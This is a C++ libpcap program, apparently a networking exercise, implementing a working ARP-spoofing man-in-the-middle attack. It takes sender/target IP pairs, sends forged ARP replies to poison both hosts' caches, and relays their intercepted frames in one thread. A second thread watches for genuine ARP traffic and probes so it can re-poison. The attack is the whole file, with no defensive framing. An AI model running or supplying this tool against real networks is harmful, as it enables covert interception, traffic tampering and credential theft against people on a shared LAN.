#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <thread>
#include <set>
#include <map>
#include <vector>
#include "ethhdr.h"
#include "arphdr.h"
#include "getIpMac.h"

#pragma pack(push, 1)
struct EthArpPacket final 
{
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

#define SPOOFING_PCAP_BUF_SIZE 4096


void usage() 
{
	printf("arguments error\n");
}

string reqArp(pcap_t* pcap, EthArpPacket pk, char* sender_ip, string myMac, string myIp) 
{
	pk.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	pk.eth_.smac_ = Mac(myMac);
	pk.eth_.type_ = htons(EthHdr::Arp);
	pk.arp_.hrd_ = htons(ArpHdr::ETHER);
	pk.arp_.pro_ = htons(EthHdr::Ip4); 
	pk.arp_.hln_ = Mac::Size;
	pk.arp_.pln_ = Ip::Size;
	pk.arp_.op_ = htons(ArpHdr::Request);
	pk.arp_.smac_ = Mac(myMac);
	pk.arp_.sip_ = htonl(Ip(myIp));
	pk.arp_.tmac_ = Mac("00:00:00:00:00:00");
	pk.arp_.tip_ = htonl(Ip(sender_ip));
	
	struct pcap_pkthdr* header;
	const u_char* packet;

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pk), sizeof(EthArpPacket));
	if (res != 0) 
	{
		fprintf(stderr, "1");
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		return "";
	}
	int res1 = pcap_next_ex(pcap, &header, &packet);
	if (res1 == PCAP_ERROR || res1 == PCAP_ERROR_BREAK) 
	{
		printf("pcap_next_ex return %d(%s)\n", res1, pcap_geterr(pcap));
		return "";
	}
	EthArpPacket* chk = (EthArpPacket*)packet;
			
	if((chk->eth_.type_ == 0x0608) && (chk->arp_.op_ == 0x0200)) 
	{
		return (string)chk->arp_.smac_; 
	}
	return reqArp(pcap, pk, sender_ip, myMac, myIp);
}

void attackArpTable(pcap_t* pcap, EthArpPacket packet, string sender_mac, char* sender_ip, char* target_ip, std::string myMac)
{
	// ethernet layer
	packet.eth_.dmac_ = Mac(sender_mac);
	packet.eth_.smac_ = Mac(myMac);
	packet.eth_.type_ = htons(EthHdr::Arp);
	// arp layer
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(myMac);
	packet.arp_.sip_ = htonl(Ip(target_ip));
	packet.arp_.tmac_ = Mac(sender_mac);
	packet.arp_.tip_ = htonl(Ip(sender_ip));
	
	
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) 
		{
			fprintf(stderr, "2");
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}
}
void attack(pcap_t* pcap, string sender_mac, string target_mac, char* sender_ip, char* target_ip, std::string myMac)
{
	EthArpPacket packet;
	attackArpTable(pcap, packet, sender_mac, sender_ip, target_ip, myMac);		
	attackArpTable(pcap, packet, target_mac, target_ip, sender_ip, myMac);
}


void startSpoofing(pcap_t* pcap, string sender_mac, char* sender_ip, char* target_ip, string myMac, string target_mac)
{
	while(true)
		{
			struct pcap_pkthdr* header;
			const u_char* packet;
			string desMac = "";
			string srcMac = "";
			
			int res = pcap_next_ex(pcap, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) 
			{
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
				break;
			}
			EthHdr* eth = (EthHdr*)packet;
			srcMac = (string)eth->smac_;
			
			/*
			u_char* buf = (u_char*)malloc(header->caplen);
			memcpy(buf, packet, header->caplen); 
			EthHdr* eth = reinterpret_cast<EthHdr*>(buf);
			srcMac = (string)eth->smac_;
			*/

			if (srcMac == myMac) 
			{
				//free(buf);
				continue;
			}
			if (srcMac == sender_mac)
			{
				eth->smac_ = myMac;
				eth->dmac_ = target_mac;
				res = pcap_sendpacket(pcap, packet, header->caplen);
				if (res != 0) 
				{
					fprintf(stderr, "3");
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
				}
			}	
			if (srcMac == target_mac)
			{
				eth->smac_ = myMac;
				eth->dmac_ = sender_mac;
				res = pcap_sendpacket(pcap, packet, header->caplen);
				if (res != 0) 
				{
					fprintf(stderr, "4");
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
				}
			}
			//free(buf);
		}
}

int detectedArp(char* dev, string sender_mac, string target_mac, char* sender_ip, char* target_ip, string myMac)
{
	const Ip s_ip(sender_ip);
	const Ip t_ip(target_ip);
	Ip senderIp = ntohl(s_ip);
	Ip targetIp = ntohl(t_ip);
	
	char errbuf2[PCAP_ERRBUF_SIZE];
	pcap_t* pcap2 = pcap_open_live(dev, PCAP_BUF_SIZE, 1, 1, errbuf2);
	if (pcap2 == nullptr) 
	{
	
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf2);
		return EXIT_FAILURE;
	}
	
	while(true)
	{
		struct pcap_pkthdr* header;
		const u_char* packet;
		string myIp = getMyIp(dev);
		string myMac = getMyMac(dev);
		
		int res = pcap_next_ex(pcap2, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) 
			{
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap2));
				break;
			}

		EthArpPacket* ethArp = (EthArpPacket*)packet;
		if (ntohs(ethArp->eth_.type_) != ethArp->eth_.Arp) continue;
		//printf("%04x\n", ntohs(ethArp->eth_.type_));
		//printf("%d\n", ntohs(ethArp->eth_.type_) == ethArp->eth_.Arp);
		//printf("%d\n", ethArp->arp_.sip_ == senderIp);

		if (ethArp->arp_.sip_ == senderIp && ethArp->arp_.tip_ == targetIp) // normal arp
		{
			attack(pcap2, sender_mac, target_mac, sender_ip, target_ip, myMac);
		}
		else if (ethArp->arp_.sip_ == targetIp && (ethArp->arp_.tip_ == senderIp))
		{
			attack(pcap2, sender_mac, target_mac, sender_ip, target_ip, myMac);
		}
		if (ethArp->arp_.op_ == ethArp->arp_.Request && ethArp->arp_.sip_ == Ip("0.0.0.0") && ethArp->arp_.tip_ == t_ip) // arp probe rfc5227
		{
			attack(pcap2, sender_mac, target_mac, sender_ip, target_ip, myMac);
		}
		else if (ethArp->arp_.op_ == ethArp->arp_.Request && ethArp->eth_.dmac_ == Mac("ff:ff:ff:ff:ff:ff") && ethArp->arp_.sip_ == Ip("0.0.0.0") && ethArp->arp_.tip_ == s_ip)
		{
			attack(pcap2, sender_mac, target_mac, sender_ip, target_ip, myMac);
		}

	}
	pcap_close(pcap2);
	return 0;
}

string get_mac_cached(pcap_t* pcap, EthArpPacket pk, char* ip, const string& myMac, const string& myIp, map<string,string>& cache)
{
	string key = ip;
	auto it = cache.find(key);
	if (it != cache.end()) return it->second;
    string mac = reqArp(pcap, pk, ip, myMac, myIp);
    if (!mac.empty()) cache[key] = mac;
    return mac;
}

int main(int argc, char* argv[]) 
{
	if (argc < 3) 
	{
		usage();
		return EXIT_FAILURE;
	}
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	set<string> IpChk;
	map<string, string> IpMac;
	vector<thread> targetNumber;
	std::vector<pcap_t*> pcaps;
	pcap_t* pcap = pcap_open_live(dev, SPOOFING_PCAP_BUF_SIZE, 1, 1, errbuf);
	if (pcap == nullptr) 
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}
	
	string myIp = getMyIp(dev);
	string myMac = getMyMac(dev);

	EthArpPacket packet;
	
	for (int i = 0; i < (argc - 2) / 2; i++) 
	{
		char* sender_ip = argv[i * 2 + 2];
        char* target_ip = argv[i * 2 + 3];
		string pair_key = string(sender_ip) + "|" + string(target_ip);
        if (!IpChk.insert(pair_key).second) continue;
		
		string sender_mac = get_mac_cached(pcap, packet, sender_ip, myMac, myIp, IpMac);
		if (sender_mac.empty()) continue;
		cout << "sender_mac :: " << sender_mac << endl;
		string target_mac = get_mac_cached(pcap, packet, target_ip, myMac, myIp, IpMac);
		if (target_mac.empty()) continue;
		cout << "target_mac :: " << target_mac << endl;
		
		char errL[PCAP_ERRBUF_SIZE]{};
		pcap_t* pcap_pair = pcap_open_live(dev, SPOOFING_PCAP_BUF_SIZE, 1, 1, errL);
		if (!pcap_pair) continue;
		pcaps.push_back(pcap_pair);

		
		attack(pcap_pair, sender_mac, target_mac, sender_ip, target_ip, myMac);
		
		targetNumber.emplace_back(startSpoofing, pcap_pair, sender_mac, sender_ip, target_ip, myMac, target_mac);
		targetNumber.emplace_back(detectedArp,  dev, sender_mac, target_mac, sender_ip, target_ip, myMac);
		//t1.join();
		//t2.join();
	}
	for (auto& t : targetNumber) t.join();
	for (auto* h : pcaps) pcap_close(h);
	pcap_close(pcap);
}
